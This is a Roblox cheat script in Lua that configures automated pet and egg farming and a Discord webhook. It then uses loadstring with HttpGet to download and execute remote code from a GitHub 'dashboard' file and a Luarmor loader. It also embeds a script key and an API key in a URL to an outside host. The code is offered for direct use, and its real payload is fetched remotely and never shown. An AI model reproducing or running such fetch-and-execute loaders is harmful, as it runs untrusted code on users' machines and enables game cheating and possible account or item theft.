script_key="YGrKhPfsuQRouMckrGHzIUguqWoYkcQH";
getgenv().Config = {
    ["Winter_EVENT"] = false,
    ["PetFarmActive"] = true,
    ["EggFarmActive"] = false,
    ["Blur_username"] = true,
    ["Blazing_Lion_Log"] = false,
    ["DiscordId"] = "123456",
    ["Webhook"] = "https://discord.com/api/webhooks/123456",
}

task.spawn(function()
    task.wait(35)
    getfenv().url = "http://xdiw.xyz/update/felps4_20?api_key=252b9c71516448b6832fe5fe1cc1386f"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/darzex/dashboard/main/main.lua"))()
end)

task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/66567bfd337b57eb059b58dbe1badb89.lua"))()
    end)
end)
